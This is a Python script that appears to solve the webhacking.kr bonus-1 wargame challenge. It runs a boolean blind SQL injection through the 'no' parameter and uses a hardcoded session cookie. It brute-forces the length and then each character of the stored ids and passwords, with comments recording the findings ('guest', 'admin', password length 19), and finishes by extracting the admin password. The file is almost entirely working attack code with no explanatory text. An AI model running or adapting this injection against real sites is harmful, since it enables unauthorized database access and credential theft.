import requests
import urllib
import string

available_chars = string.lowercase + string.uppercase + string.digits

cookies = {"PHPSESSID": "2decc47b5313e0d64ccda07b11df6a79"}
url = "http://webhacking.kr/challenge/bonus/bonus-1/index.php?"
"""
for i in range(1,5) :
    n = i
    ids = ""
    pw = ""
    payload = "?no=%s&id=%s&pw=%s" % (n,ids,pw)
    #payload = "?no=%s" % (n)
    r = requests.get(url+payload, cookies=cookies)
    print r.text.find("True")"""
# two table exist with no 1 and 2

# now bruteforcing for first row i.e no=1
# first find length of id
"""for l in range(1,10) :
    n = "1 and length(id)=%s" % l
    params = {'no':n, 'id':'', 'pw':''}
    payload = urllib.urlencode(params)
    r = requests.get(url+payload, cookies=cookies)
    if r.text.find("True") != -1 :
        print l
        break"""
# length of id is 5
# now find length of pw
"""for l in range(1,50) :
    n = "1 and length(pw)=%s" % l
    params = {'no': n, 'id': '', 'pw': ''}
    payload = urllib.urlencode(params)
    r = requests.get(url+payload, cookies=cookies)
    print l, r.text.find("True")
    if r.text.find("True") != -1 :
        break"""
# length of pw is 5
# now find the value of id
"""r1_id = ""
for l in range(1,6) :
    for c in available_chars :
        n = "1 and ascii(substring(id,%s,1))=%s" % (l,ord(c))
        params = {'no': n, 'id': '', 'pw': ''}
        payload = urllib.urlencode(params)
        r = requests.get(url+payload, cookies=cookies)
        if r.text.find("True") != -1 :
            r1_id += c
            print r1_id
            break"""
r1_id = "guest"

# no need to find password for guest
# move to row two
# finding length of id in low 2
"""for l in range(1,20) :
    n = "2 and length(id)=%s" % l
    params = {'no':n, 'id':'', 'pw':''}
    payload = urllib.urlencode(params)
    r = requests.get(url+payload, cookies=cookies)
    if r.text.find("True") != -1 :
        print l
        break"""
# length id is 5

# find the length password
"""for l in range(1,50) :
    n = "2 and length(pw)=%s" % l
    params = {'no':n, 'id':'', 'pw':''}
    payload = urllib.urlencode(params)
    r = requests.get(url+payload, cookies=cookies)
    if r.text.find("True") != -1 :
        print l
        break"""
# length password is 19

# find value of id
r2_id = ""
"""for l in range(1,6) :
    for c in available_chars :
        n = "2 and ascii(substring(id,%s,1))=%s" % (l, ord(c))
        params = {'no': n, 'id': '', 'pw': ''}
        payload = urllib.urlencode(params)
        r = requests.get(url+payload, cookies=cookies)
        if r.text.find("True") != -1 :
            r2_id += c
            print r2_id
            break"""
r2_id = "admin"

# now find password value
r2_pw = ""
for l in range(1,20) :
    for c in available_chars :
        n = "2 and ascii(substring(pw,%s,1))=%s" % (l, ord(c))
        params = {'no': n, 'id': '', 'pw': ''}
        payload = urllib.urlencode(params)
        r = requests.get(url+payload, cookies=cookies)
        if r.text.find("True") != -1 :
            r2_pw += c
            print r2_pw
            break
    if len(r2_pw) != l :
        for c in string.punctuation + string.whitespace :
            n = "2 and ascii(substring(pw,%s,1))=%s" % (l, ord(c))
            params = {'no': n, 'id': '', 'pw': ''}
            payload = urllib.urlencode(params)
            r = requests.get(url+payload, cookies=cookies)
            if r.text.find("True") != -1:
                r2_pw += c
                print r2_pw
                break
